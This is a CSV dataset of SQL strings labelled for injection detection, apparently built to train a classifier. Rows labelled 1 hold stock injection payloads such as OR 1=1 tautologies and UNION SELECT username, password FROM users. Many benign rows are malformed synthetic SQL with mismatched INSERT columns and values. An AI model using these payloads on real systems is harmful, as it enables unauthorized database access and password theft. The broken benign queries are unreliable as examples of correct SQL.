query,label
SELECT * FROM users WHERE password='' OR '1'='1';,1
DELETE FROM products WHERE price>3;,0
' OR 1=1 --,1
' OR '1'='1' --,1
' OR 1=1 --,1
SELECT username FROM customers WHERE id=10;,0
"INSERT INTO users (username, name) VALUES ('test@example.com', 'Bob', 'Alice');",0
' OR 1=1 --,1
SELECT * FROM products WHERE id=1 OR 1=1 --;,1
UPDATE users SET price='Bob' WHERE status='8';,0
UPDATE products SET password='test@example.com' WHERE id=9;,0
SELECT * FROM customers WHERE name='' OR '1'='1';,1
UPDATE users SET username=1 WHERE user_id=6;,0
UPDATE orders SET email=2 WHERE price>4;,0
' OR '1'='1' --,1
"' UNION SELECT username, password FROM users --",1
DELETE FROM customers WHERE id=3;,0
' OR 1=1 --,1
' OR '1'='1' --,1
SELECT * FROM customers WHERE price='' UNION SELECT password FROM users --;,1
"INSERT INTO cart (name, password, username) VALUES (2, 'Alice');",0
"INSERT INTO customers (name, username) VALUES (100, 2);",0
SELECT * FROM customers WHERE id=1 OR 1=1 --;,1
' OR '1'='1' --,1
DELETE FROM products WHERE country='5';,0
SELECT * FROM users WHERE quantity='' UNION SELECT password FROM users --;,1
DELETE FROM products WHERE user_id=3;,0
"' UNION SELECT username, password FROM users --",1
' OR 1=1 --,1
DELETE FROM orders WHERE status='7';,0
"INSERT INTO users (email) VALUES ('Bob', 'test@example.com', 5);",0
INSERT INTO products (password) VALUES (2);,0
SELECT * FROM customers WHERE name='' OR '1'='1';,1
UPDATE products SET quantity='Alice' WHERE status='6';,0
"' UNION SELECT username, password FROM users --",1
SELECT * FROM orders WHERE password='' OR '1'='1';,1
SELECT * FROM customers WHERE quantity='' UNION SELECT password FROM users --;,1
DELETE FROM cart WHERE id=3;,0
DELETE FROM customers WHERE status='1';,0
SELECT * FROM users WHERE name='' OR '1'='1';,1
' OR '1'='1' --,1
"' UNION SELECT username, password FROM users --",1
"SELECT username, password FROM orders WHERE status='9';",0
"' UNION SELECT username, password FROM users --",1
"INSERT INTO orders (id, email, price) VALUES (100, 'test@example.com');",0
"INSERT INTO users (id, price, name) VALUES (2);",0
"SELECT password, id, name FROM customers WHERE price>9;",0
SELECT * FROM cart WHERE status='' OR '1'='1';,1
SELECT * FROM customers WHERE id=1 OR 1=1 --;,1
"' UNION SELECT username, password FROM users --",1
"INSERT INTO orders (quantity, username, id) VALUES (1, 5);",0
"SELECT name, status, id FROM cart WHERE id=1;",0
SELECT name FROM orders WHERE user_id=10;,0
UPDATE cart SET price=1 WHERE user_id=4;,0
DELETE FROM products WHERE country='3';,0
UPDATE cart SET username='Bob' WHERE id=3;,0
SELECT * FROM customers WHERE id='' OR 'a'='a';,1
SELECT * FROM products WHERE id=1 OR 1=1 --;,1
SELECT * FROM products WHERE quantity='' OR 'a'='a';,1
' OR '1'='1' --,1
SELECT * FROM customers WHERE name='' UNION SELECT password FROM users --;,1
DELETE FROM cart WHERE id=8;,0
UPDATE customers SET username=5 WHERE user_id=2;,0
DELETE FROM users WHERE price>9;,0
SELECT * FROM orders WHERE status='' UNION SELECT password FROM users --;,1
"SELECT quantity, username FROM products WHERE id=1;",0
"INSERT INTO cart (email, id) VALUES (100, 1);",0
SELECT price FROM orders WHERE user_id=5;,0
SELECT * FROM orders WHERE id=1 OR 1=1 --;,1
UPDATE orders SET email=5 WHERE id=4;,0
SELECT * FROM users WHERE status='' UNION SELECT password FROM users --;,1
"INSERT INTO customers (price, username) VALUES ('Alice');",0
"SELECT price, name FROM products WHERE id=6;",0
SELECT * FROM cart WHERE quantity='' OR 'a'='a';,1
"INSERT INTO orders (status) VALUES (2, 5);",0
DELETE FROM orders WHERE id=9;,0
' OR 1=1 --,1
SELECT * FROM cart WHERE username='' OR '1'='1';,1
"SELECT status, password, name FROM users WHERE price>4;",0
UPDATE products SET email=1 WHERE status='3';,0
"SELECT email, status FROM users WHERE status='6';",0
SELECT * FROM users WHERE password='' OR '1'='1';,1
"SELECT id, quantity, price FROM customers WHERE user_id=2;",0
DELETE FROM users WHERE status='5';,0
"' UNION SELECT username, password FROM users --",1
SELECT * FROM customers WHERE email='' UNION SELECT password FROM users --;,1
DELETE FROM products WHERE id=3;,0
DELETE FROM orders WHERE status='3';,0
"INSERT INTO customers (quantity, id) VALUES (5, 100, 1);",0
"INSERT INTO orders (username, password) VALUES (5);",0
"INSERT INTO customers (username, price) VALUES ('Bob', 100);",0
SELECT * FROM cart WHERE password='' UNION SELECT password FROM users --;,1
DELETE FROM cart WHERE price>6;,0
' OR '1'='1' --,1
SELECT * FROM products WHERE id='' OR 'a'='a';,1
SELECT password FROM cart WHERE price>8;,0
SELECT * FROM orders WHERE password='' OR 'a'='a';,1
"INSERT INTO cart (name) VALUES (2, 'Bob', 5);",0
SELECT * FROM products WHERE username='' UNION SELECT password FROM users --;,1
SELECT * FROM products WHERE name='' OR '1'='1';,1
' OR 1=1 --,1
"' UNION SELECT username, password FROM users --",1
SELECT * FROM users WHERE id=1 OR 1=1 --;,1
DELETE FROM users WHERE user_id=4;,0
"SELECT id, email, name FROM products WHERE status='9';",0
' OR '1'='1' --,1
"' UNION SELECT username, password FROM users --",1
DELETE FROM cart WHERE id=4;,0
SELECT * FROM users WHERE status='' OR 'a'='a';,1
' OR '1'='1' --,1
UPDATE products SET price=100 WHERE country='1';,0
UPDATE products SET status='Alice' WHERE price>10;,0
"' UNION SELECT username, password FROM users --",1
"INSERT INTO customers (quantity, email, name) VALUES (5);",0
SELECT * FROM products WHERE name='' OR '1'='1';,1
SELECT * FROM users WHERE quantity='' OR 'a'='a';,1
UPDATE customers SET username=5 WHERE user_id=2;,0
"SELECT id, status FROM products WHERE status='7';",0
' OR 1=1 --,1
DELETE FROM orders WHERE price>6;,0
SELECT email FROM cart WHERE price>4;,0
"' UNION SELECT username, password FROM users --",1
' OR 1=1 --,1
SELECT * FROM orders WHERE name='' OR '1'='1';,1
"SELECT username, id FROM customers WHERE id=10;",0
' OR '1'='1' --,1
"' UNION SELECT username, password FROM users --",1
SELECT * FROM products WHERE password='' UNION SELECT password FROM users --;,1
SELECT * FROM customers WHERE id='' OR 'a'='a';,1
"SELECT id, quantity FROM products WHERE id=4;",0
' OR '1'='1' --,1
SELECT * FROM cart WHERE id=1 OR 1=1 --;,1
SELECT * FROM products WHERE id=1 OR 1=1 --;,1
UPDATE cart SET price='Alice' WHERE country='1';,0
SELECT * FROM users WHERE username='' OR 'a'='a';,1
SELECT name FROM orders WHERE status='1';,0
SELECT * FROM users WHERE username='' UNION SELECT password FROM users --;,1
"INSERT INTO customers (price, name, id) VALUES ('Bob', 100);",0
SELECT * FROM orders WHERE id=1 OR 1=1 --;,1
"INSERT INTO users (id, username, price) VALUES (2);",0
SELECT quantity FROM products WHERE price>9;,0
SELECT * FROM customers WHERE id=1 OR 1=1 --;,1
SELECT * FROM customers WHERE name='' OR 'a'='a';,1
SELECT * FROM customers WHERE price='' OR 'a'='a';,1
' OR '1'='1' --,1
SELECT * FROM cart WHERE status='' OR 'a'='a';,1
"' UNION SELECT username, password FROM users --",1
"INSERT INTO orders (status) VALUES (100, 'Alice', 2);",0
"' UNION SELECT username, password FROM users --",1
' OR '1'='1' --,1
SELECT * FROM users WHERE id=1 OR 1=1 --;,1
"' UNION SELECT username, password FROM users --",1
DELETE FROM orders WHERE id=2;,0
SELECT * FROM cart WHERE password='' UNION SELECT password FROM users --;,1
SELECT price FROM products WHERE status='5';,0
"INSERT INTO orders (name, id) VALUES ('test@example.com');",0
DELETE FROM orders WHERE price>1;,0
UPDATE customers SET username=100 WHERE price>4;,0
"INSERT INTO cart (quantity, username, password) VALUES (2, 1);",0
' OR '1'='1' --,1
"' UNION SELECT username, password FROM users --",1
' OR '1'='1' --,1
' OR 1=1 --,1
SELECT * FROM cart WHERE price='' OR '1'='1';,1
' OR 1=1 --,1
"SELECT id, username FROM products WHERE price>6;",0
SELECT * FROM products WHERE email='' OR 'a'='a';,1
DELETE FROM orders WHERE user_id=3;,0
"INSERT INTO orders (id, price) VALUES ('Alice', 'test@example.com', 1);",0
DELETE FROM cart WHERE user_id=1;,0
"SELECT password, status, name FROM customers WHERE id=9;",0
' OR 1=1 --,1
DELETE FROM cart WHERE user_id=2;,0
' OR '1'='1' --,1
DELETE FROM customers WHERE status='7';,0
SELECT * FROM products WHERE name='' OR 'a'='a';,1
DELETE FROM cart WHERE user_id=9;,0
"INSERT INTO cart (quantity) VALUES (100, 5, 2);",0
UPDATE orders SET status='Alice' WHERE status='8';,0
DELETE FROM cart WHERE id=10;,0
' OR '1'='1' --,1
"' UNION SELECT username, password FROM users --",1
UPDATE cart SET quantity=5 WHERE user_id=4;,0
SELECT * FROM products WHERE quantity='' OR 'a'='a';,1
SELECT * FROM users WHERE name='' UNION SELECT password FROM users --;,1
"INSERT INTO products (price, password, id) VALUES ('Bob');",0
SELECT * FROM orders WHERE price='' OR 'a'='a';,1
DELETE FROM users WHERE user_id=9;,0
"' UNION SELECT username, password FROM users --",1
DELETE FROM users WHERE id=8;,0
"' UNION SELECT username, password FROM users --",1
SELECT * FROM users WHERE price='' UNION SELECT password FROM users --;,1
DELETE FROM products WHERE id=5;,0
"INSERT INTO orders (password, id, username) VALUES (100, 2);",0
"' UNION SELECT username, password FROM users --",1
SELECT * FROM cart WHERE id='' UNION SELECT password FROM users --;,1
UPDATE cart SET id=1 WHERE price>3;,0
SELECT * FROM users WHERE quantity='' OR 'a'='a';,1
DELETE FROM customers WHERE status='3';,0
SELECT * FROM products WHERE id='' UNION SELECT password FROM users --;,1
DELETE FROM customers WHERE country='1';,0
DELETE FROM customers WHERE price>10;,0
"SELECT name, id, price FROM products WHERE id=8;",0
' OR '1'='1' --,1
UPDATE users SET email='test@example.com' WHERE country='6';,0
' OR '1'='1' --,1
INSERT INTO products (password) VALUES (5);,0
' OR 1=1 --,1
' OR 1=1 --,1
SELECT * FROM customers WHERE id=1 OR 1=1 --;,1
"INSERT INTO customers (quantity, id) VALUES (5);",0
"INSERT INTO cart (email) VALUES (1, 'Bob', 'test@example.com');",0
SELECT * FROM users WHERE quantity='' OR 'a'='a';,1
SELECT * FROM customers WHERE id=1 OR 1=1 --;,1
' OR '1'='1' --,1
"SELECT price, password, status FROM orders WHERE user_id=9;",0
' OR 1=1 --,1
"' UNION SELECT username, password FROM users --",1
UPDATE cart SET id=1 WHERE id=8;,0
SELECT * FROM cart WHERE name='' OR '1'='1';,1
' OR '1'='1' --,1
UPDATE customers SET quantity=1 WHERE country='2';,0
' OR 1=1 --,1
DELETE FROM products WHERE id=7;,0
SELECT * FROM orders WHERE id=1 OR 1=1 --;,1
' OR 1=1 --,1
SELECT * FROM products WHERE id=1 OR 1=1 --;,1
UPDATE customers SET quantity=5 WHERE status='10';,0
UPDATE customers SET quantity='test@example.com' WHERE user_id=3;,0
SELECT * FROM customers WHERE id=1 OR 1=1 --;,1
SELECT * FROM orders WHERE price='' OR '1'='1';,1
UPDATE cart SET quantity=5 WHERE country='9';,0
DELETE FROM orders WHERE status='10';,0
"' UNION SELECT username, password FROM users --",1
' OR '1'='1' --,1
"INSERT INTO orders (id, name) VALUES (100);",0
DELETE FROM cart WHERE user_id=8;,0
SELECT * FROM cart WHERE id='' UNION SELECT password FROM users --;,1
"INSERT INTO orders (email) VALUES (100, 'Alice');",0
UPDATE products SET price='Bob' WHERE id=1;,0
UPDATE cart SET price=5 WHERE user_id=1;,0
"INSERT INTO customers (id) VALUES ('Bob', 'test@example.com', 100);",0
SELECT * FROM users WHERE id='' OR '1'='1';,1
"' UNION SELECT username, password FROM users --",1
"INSERT INTO customers (username, quantity, price) VALUES ('Alice', 1, 100);",0
DELETE FROM users WHERE id=6;,0
DELETE FROM cart WHERE country='2';,0
"INSERT INTO customers (status) VALUES (1, 2);",0
DELETE FROM orders WHERE price>7;,0
SELECT * FROM orders WHERE id=1 OR 1=1 --;,1
SELECT * FROM orders WHERE id='' UNION SELECT password FROM users --;,1
' OR 1=1 --,1
SELECT * FROM customers WHERE password='' OR '1'='1';,1
SELECT * FROM orders WHERE email='' OR '1'='1';,1
DELETE FROM products WHERE price>7;,0
SELECT * FROM cart WHERE price='' OR 'a'='a';,1
"INSERT INTO orders (username, status) VALUES (1);",0
DELETE FROM orders WHERE country='4';,0
UPDATE customers SET status='Alice' WHERE id=7;,0
DELETE FROM cart WHERE country='8';,0
SELECT * FROM products WHERE username='' UNION SELECT password FROM users --;,1
DELETE FROM users WHERE id=10;,0
SELECT * FROM products WHERE quantity='' OR 'a'='a';,1
"' UNION SELECT username, password FROM users --",1
SELECT name FROM orders WHERE price>5;,0
UPDATE cart SET quantity=2 WHERE id=1;,0
SELECT * FROM products WHERE id=1 OR 1=1 --;,1
"INSERT INTO cart (password, name, price) VALUES ('test@example.com');",0
SELECT * FROM customers WHERE id=1 OR 1=1 --;,1
SELECT * FROM users WHERE id=1 OR 1=1 --;,1
' OR 1=1 --,1
' OR '1'='1' --,1
SELECT * FROM cart WHERE price='' OR '1'='1';,1
"INSERT INTO users (email, quantity) VALUES ('test@example.com');",0
UPDATE products SET password=1 WHERE price>4;,0
SELECT * FROM orders WHERE password='' OR 'a'='a';,1
SELECT * FROM cart WHERE id=1 OR 1=1 --;,1
SELECT * FROM products WHERE quantity='' UNION SELECT password FROM users --;,1
SELECT * FROM cart WHERE id='' UNION SELECT password FROM users --;,1
DELETE FROM orders WHERE user_id=5;,0
"' UNION SELECT username, password FROM users --",1
' OR 1=1 --,1
SELECT * FROM orders WHERE password='' OR '1'='1';,1
SELECT * FROM cart WHERE id=1 OR 1=1 --;,1
"SELECT price, name FROM products WHERE country='5';",0
UPDATE products SET username=100 WHERE status='7';,0
SELECT * FROM cart WHERE status='' OR '1'='1';,1
SELECT * FROM products WHERE id=1 OR 1=1 --;,1
"' UNION SELECT username, password FROM users --",1
SELECT * FROM orders WHERE password='' OR '1'='1';,1
SELECT * FROM products WHERE id=1 OR 1=1 --;,1
SELECT status FROM users WHERE user_id=4;,0
SELECT * FROM cart WHERE username='' OR '1'='1';,1
' OR 1=1 --,1
' OR 1=1 --,1
DELETE FROM cart WHERE id=6;,0
' OR 1=1 --,1
UPDATE users SET name='Alice' WHERE price>1;,0
"INSERT INTO users (quantity, password) VALUES ('Bob', 1);",0
SELECT * FROM orders WHERE status='' UNION SELECT password FROM users --;,1
UPDATE customers SET username='Alice' WHERE user_id=9;,0
"INSERT INTO cart (password, quantity) VALUES (5, 'test@example.com');",0
"SELECT quantity, email, name FROM orders WHERE country='8';",0
SELECT email FROM orders WHERE price>10;,0
UPDATE orders SET password=2 WHERE id=2;,0
SELECT * FROM cart WHERE id=1 OR 1=1 --;,1
"INSERT INTO customers (name) VALUES (1, 'Alice', 5);",0
"INSERT INTO cart (price, id, email) VALUES (5, 100, 'Bob');",0
SELECT status FROM cart WHERE country='3';,0
UPDATE customers SET email=100 WHERE user_id=8;,0
SELECT * FROM orders WHERE status='' UNION SELECT password FROM users --;,1
DELETE FROM products WHERE id=2;,0
"SELECT name, password, email FROM products WHERE id=5;",0
SELECT * FROM cart WHERE id=1 OR 1=1 --;,1
' OR 1=1 --,1
SELECT * FROM cart WHERE id=1 OR 1=1 --;,1
SELECT * FROM users WHERE quantity='' OR 'a'='a';,1
UPDATE customers SET price='test@example.com' WHERE status='1';,0
UPDATE products SET password='test@example.com' WHERE id=5;,0
"SELECT name, email, password FROM users WHERE status='3';",0
"INSERT INTO customers (id, email, name) VALUES (100, 'Bob', 5);",0
"INSERT INTO cart (id, email) VALUES ('test@example.com', 'Alice', 100);",0
SELECT * FROM orders WHERE password='' UNION SELECT password FROM users --;,1
"INSERT INTO users (name, password, id) VALUES (100, 'test@example.com', 'Alice');",0
DELETE FROM customers WHERE status='9';,0
SELECT name FROM products WHERE user_id=4;,0
"INSERT INTO users (status) VALUES ('Alice', 'Bob', 5);",0
"' UNION SELECT username, password FROM users --",1
SELECT * FROM orders WHERE quantity='' UNION SELECT password FROM users --;,1
UPDATE orders SET price=1 WHERE id=7;,0
' OR '1'='1' --,1
UPDATE cart SET password=5 WHERE id=4;,0
DELETE FROM customers WHERE status='5';,0
"INSERT INTO users (id, status, name) VALUES ('Alice', 100);",0
UPDATE cart SET password=100 WHERE country='1';,0
DELETE FROM products WHERE status='6';,0
' OR '1'='1' --,1
DELETE FROM users WHERE id=9;,0
SELECT * FROM products WHERE email='' OR '1'='1';,1
"INSERT INTO products (email, id, quantity) VALUES ('Alice');",0
"' UNION SELECT username, password FROM users --",1
SELECT * FROM users WHERE id=1 OR 1=1 --;,1
SELECT * FROM orders WHERE password='' OR 'a'='a';,1
UPDATE users SET username=1 WHERE user_id=7;,0
SELECT * FROM cart WHERE name='' OR 'a'='a';,1
"INSERT INTO customers (quantity) VALUES (5, 2, 1);",0
SELECT * FROM products WHERE id=1 OR 1=1 --;,1
' OR 1=1 --,1
INSERT INTO cart (password) VALUES ('Bob');,0
"INSERT INTO cart (username, id) VALUES ('test@example.com', 'Bob', 100);",0
UPDATE customers SET status=5 WHERE user_id=1;,0
' OR 1=1 --,1
DELETE FROM customers WHERE status='1';,0
"SELECT email, username, name FROM users WHERE user_id=1;",0
' OR '1'='1' --,1
"SELECT price, username FROM customers WHERE id=3;",0
UPDATE customers SET quantity=1 WHERE user_id=3;,0
"INSERT INTO customers (name) VALUES ('Alice', 2, 1);",0
"' UNION SELECT username, password FROM users --",1
"' UNION SELECT username, password FROM users --",1
SELECT * FROM users WHERE price='' OR 'a'='a';,1
' OR '1'='1' --,1
SELECT * FROM orders WHERE email='' OR '1'='1';,1
SELECT * FROM cart WHERE id=1 OR 1=1 --;,1
SELECT status FROM cart WHERE country='1';,0
"INSERT INTO orders (quantity, name, id) VALUES ('Alice');",0
' OR '1'='1' --,1
UPDATE products SET price=1 WHERE id=1;,0
DELETE FROM cart WHERE id=9;,0
"SELECT email, price, name FROM users WHERE price>10;",0
' OR 1=1 --,1
DELETE FROM products WHERE status='2';,0
' OR '1'='1' --,1
SELECT * FROM users WHERE id='' OR '1'='1';,1
SELECT * FROM cart WHERE name='' OR '1'='1';,1
"INSERT INTO customers (price, username) VALUES ('test@example.com', 1);",0
SELECT * FROM users WHERE status='' OR '1'='1';,1
SELECT * FROM products WHERE id=1 OR 1=1 --;,1
DELETE FROM products WHERE user_id=3;,0
SELECT * FROM users WHERE quantity='' UNION SELECT password FROM users --;,1
SELECT quantity FROM users WHERE user_id=1;,0
SELECT * FROM products WHERE id=1 OR 1=1 --;,1
UPDATE orders SET name='Alice' WHERE status='10';,0
"INSERT INTO orders (id) VALUES (100, 5, 2);",0
SELECT email FROM customers WHERE price>1;,0
SELECT * FROM cart WHERE id='' OR '1'='1';,1
"SELECT username, email FROM customers WHERE status='10';",0
SELECT * FROM products WHERE price='' OR '1'='1';,1
"SELECT quantity, name FROM users WHERE status='9';",0
SELECT * FROM orders WHERE status='' OR 'a'='a';,1
SELECT * FROM customers WHERE email='' OR 'a'='a';,1
SELECT * FROM customers WHERE id=1 OR 1=1 --;,1
"INSERT INTO users (username, status) VALUES (1, 'test@example.com');",0
DELETE FROM customers WHERE id=2;,0
SELECT * FROM orders WHERE id=1 OR 1=1 --;,1
SELECT * FROM cart WHERE id=1 OR 1=1 --;,1
"INSERT INTO customers (name, password) VALUES (1, 'Alice', 'Bob');",0
"' UNION SELECT username, password FROM users --",1
"SELECT status, id FROM cart WHERE price>4;",0
"SELECT id, price FROM cart WHERE price>7;",0
SELECT quantity FROM products WHERE country='4';,0
"INSERT INTO customers (status, username) VALUES (100, 5);",0
UPDATE orders SET password=100 WHERE user_id=3;,0
DELETE FROM products WHERE country='4';,0
SELECT * FROM customers WHERE id=1 OR 1=1 --;,1
"INSERT INTO cart (price, id) VALUES (2);",0
SELECT * FROM orders WHERE name='' UNION SELECT password FROM users --;,1
SELECT * FROM customers WHERE name='' OR '1'='1';,1
SELECT * FROM users WHERE id=1 OR 1=1 --;,1
"INSERT INTO customers (quantity, password, id) VALUES (2, 'Alice');",0
UPDATE cart SET id='Alice' WHERE status='5';,0
INSERT INTO users (username) VALUES ('test@example.com');,0
"' UNION SELECT username, password FROM users --",1
"INSERT INTO orders (quantity, price) VALUES (1);",0
SELECT * FROM customers WHERE username='' OR '1'='1';,1
UPDATE cart SET username='Alice' WHERE id=7;,0
' OR '1'='1' --,1
UPDATE orders SET username=2 WHERE status='1';,0
SELECT email FROM customers WHERE status='5';,0
"SELECT email, quantity FROM products WHERE user_id=10;",0
DELETE FROM orders WHERE user_id=8;,0
' OR 1=1 --,1
SELECT * FROM customers WHERE id='' UNION SELECT password FROM users --;,1
SELECT * FROM orders WHERE id=1 OR 1=1 --;,1
"INSERT INTO customers (quantity) VALUES ('Bob', 100);",0
"INSERT INTO cart (username) VALUES ('Alice', 'Bob', 5);",0
UPDATE products SET id=2 WHERE id=9;,0
"INSERT INTO customers (email, status) VALUES (1, 'Alice', 100);",0
UPDATE users SET password=2 WHERE status='7';,0
DELETE FROM users WHERE status='2';,0
"SELECT username, price, status FROM customers WHERE status='8';",0
' OR '1'='1' --,1
UPDATE users SET price=1 WHERE status='3';,0
"' UNION SELECT username, password FROM users --",1
"INSERT INTO users (id, status) VALUES (5, 'test@example.com', 2);",0
"SELECT price, id FROM orders WHERE id=4;",0
SELECT * FROM cart WHERE id=1 OR 1=1 --;,1
SELECT * FROM users WHERE id=1 OR 1=1 --;,1
UPDATE customers SET username=1 WHERE user_id=6;,0
SELECT * FROM orders WHERE id=1 OR 1=1 --;,1
"' UNION SELECT username, password FROM users --",1
UPDATE cart SET username='Bob' WHERE country='4';,0
"INSERT INTO orders (status, quantity, email) VALUES ('Alice');",0
SELECT * FROM cart WHERE username='' OR '1'='1';,1
SELECT * FROM products WHERE username='' UNION SELECT password FROM users --;,1
DELETE FROM users WHERE country='1';,0
DELETE FROM products WHERE id=9;,0
"' UNION SELECT username, password FROM users --",1
SELECT email FROM orders WHERE price>1;,0
DELETE FROM products WHERE price>2;,0
UPDATE orders SET username=100 WHERE price>3;,0
' OR 1=1 --,1
SELECT * FROM cart WHERE id=1 OR 1=1 --;,1
' OR '1'='1' --,1
' OR '1'='1' --,1
SELECT * FROM products WHERE id=1 OR 1=1 --;,1
' OR '1'='1' --,1
"SELECT username, email FROM users WHERE country='6';",0
SELECT * FROM cart WHERE username='' OR '1'='1';,1
"INSERT INTO orders (price, username) VALUES ('test@example.com');",0
UPDATE customers SET id=1 WHERE status='9';,0
' OR 1=1 --,1
SELECT * FROM orders WHERE id='' OR '1'='1';,1
' OR '1'='1' --,1
' OR '1'='1' --,1
SELECT * FROM customers WHERE id='' OR '1'='1';,1
SELECT * FROM products WHERE status='' UNION SELECT password FROM users --;,1
SELECT * FROM customers WHERE id=1 OR 1=1 --;,1
SELECT * FROM products WHERE id=1 OR 1=1 --;,1
SELECT * FROM customers WHERE status='' OR 'a'='a';,1
SELECT * FROM cart WHERE email='' OR '1'='1';,1
"INSERT INTO products (username, quantity, status) VALUES ('Bob', 5);",0
"' UNION SELECT username, password FROM users --",1
SELECT * FROM cart WHERE quantity='' OR '1'='1';,1
"INSERT INTO customers (email, name, id) VALUES ('test@example.com', 100);",0
SELECT * FROM cart WHERE password='' OR 'a'='a';,1
' OR 1=1 --,1
DELETE FROM products WHERE user_id=8;,0
' OR '1'='1' --,1
SELECT * FROM orders WHERE quantity='' UNION SELECT password FROM users --;,1
DELETE FROM products WHERE country='1';,0
"' UNION SELECT username, password FROM users --",1
SELECT * FROM cart WHERE id=1 OR 1=1 --;,1
SELECT * FROM products WHERE username='' OR '1'='1';,1
' OR 1=1 --,1
UPDATE users SET email=2 WHERE id=9;,0
UPDATE users SET password='Bob' WHERE id=6;,0
' OR 1=1 --,1
"SELECT email, username FROM users WHERE price>4;",0
"INSERT INTO products (password) VALUES (5, 'test@example.com');",0
"' UNION SELECT username, password FROM users --",1
"' UNION SELECT username, password FROM users --",1
SELECT * FROM cart WHERE id=1 OR 1=1 --;,1
SELECT * FROM orders WHERE id=1 OR 1=1 --;,1
SELECT * FROM orders WHERE id='' UNION SELECT password FROM users --;,1
DELETE FROM cart WHERE status='5';,0
DELETE FROM cart WHERE id=3;,0
SELECT * FROM products WHERE name='' OR '1'='1';,1
SELECT * FROM orders WHERE username='' UNION SELECT password FROM users --;,1
"INSERT INTO customers (price, email, username) VALUES (5, 100, 'Alice');",0
DELETE FROM cart WHERE country='4';,0
INSERT INTO users (username) VALUES (5);,0
' OR 1=1 --,1
UPDATE cart SET username=100 WHERE status='3';,0
"SELECT price, email FROM cart WHERE status='8';",0
UPDATE customers SET name=100 WHERE id=8;,0
UPDATE users SET password='test@example.com' WHERE country='10';,0
SELECT * FROM cart WHERE id='' OR 'a'='a';,1
SELECT * FROM products WHERE id=1 OR 1=1 --;,1
"' UNION SELECT username, password FROM users --",1
UPDATE customers SET password=1 WHERE status='10';,0
UPDATE orders SET status='Alice' WHERE price>5;,0
"SELECT email, price FROM orders WHERE id=2;",0
"' UNION SELECT username, password FROM users --",1
"' UNION SELECT username, password FROM users --",1
SELECT * FROM products WHERE username='' OR 'a'='a';,1
DELETE FROM orders WHERE status='3';,0
DELETE FROM cart WHERE id=2;,0
UPDATE customers SET username=1 WHERE user_id=1;,0
"INSERT INTO products (email, status) VALUES (100, 'test@example.com', 2);",0
SELECT * FROM cart WHERE id='' OR 'a'='a';,1
SELECT * FROM orders WHERE username='' OR 'a'='a';,1
DELETE FROM users WHERE price>3;,0
SELECT * FROM customers WHERE name='' OR '1'='1';,1
SELECT * FROM users WHERE quantity='' UNION SELECT password FROM users --;,1
SELECT * FROM cart WHERE price='' UNION SELECT password FROM users --;,1
"' UNION SELECT username, password FROM users --",1
' OR 1=1 --,1
DELETE FROM orders WHERE user_id=2;,0
' OR '1'='1' --,1
DELETE FROM users WHERE status='10';,0
"' UNION SELECT username, password FROM users --",1
DELETE FROM users WHERE price>5;,0
DELETE FROM cart WHERE user_id=10;,0
DELETE FROM products WHERE id=1;,0
DELETE FROM products WHERE price>4;,0
' OR 1=1 --,1
SELECT * FROM cart WHERE email='' OR 'a'='a';,1
UPDATE cart SET id=2 WHERE country='2';,0
UPDATE orders SET username='Alice' WHERE price>2;,0
"INSERT INTO users (name, price, email) VALUES (1, 'test@example.com');",0
' OR 1=1 --,1
SELECT * FROM users WHERE email='' UNION SELECT password FROM users --;,1
"' UNION SELECT username, password FROM users --",1
UPDATE orders SET username=100 WHERE id=2;,0
SELECT * FROM orders WHERE quantity='' OR '1'='1';,1
DELETE FROM users WHERE price>3;,0
"' UNION SELECT username, password FROM users --",1
' OR 1=1 --,1
SELECT * FROM products WHERE quantity='' OR '1'='1';,1
SELECT * FROM products WHERE status='' UNION SELECT password FROM users --;,1
SELECT * FROM customers WHERE status='' OR '1'='1';,1
SELECT * FROM users WHERE id=1 OR 1=1 --;,1
"INSERT INTO cart (username, name, quantity) VALUES (1);",0
' OR 1=1 --,1
DELETE FROM orders WHERE price>2;,0
UPDATE cart SET email=100 WHERE price>4;,0
SELECT * FROM products WHERE email='' UNION SELECT password FROM users --;,1
"INSERT INTO users (password, id, name) VALUES (5, 100, 'test@example.com');",0
"INSERT INTO users (email, status, quantity) VALUES (100, 5);",0
UPDATE products SET email='test@example.com' WHERE country='8';,0
SELECT * FROM customers WHERE id=1 OR 1=1 --;,1
UPDATE products SET username='Bob' WHERE user_id=5;,0
"' UNION SELECT username, password FROM users --",1
SELECT * FROM products WHERE name='' OR '1'='1';,1
DELETE FROM orders WHERE user_id=2;,0
DELETE FROM customers WHERE country='1';,0
' OR 1=1 --,1
SELECT * FROM cart WHERE id=1 OR 1=1 --;,1
DELETE FROM cart WHERE price>10;,0
"SELECT password, price FROM products WHERE status='1';",0
"SELECT status, username FROM cart WHERE country='3';",0
' OR '1'='1' --,1
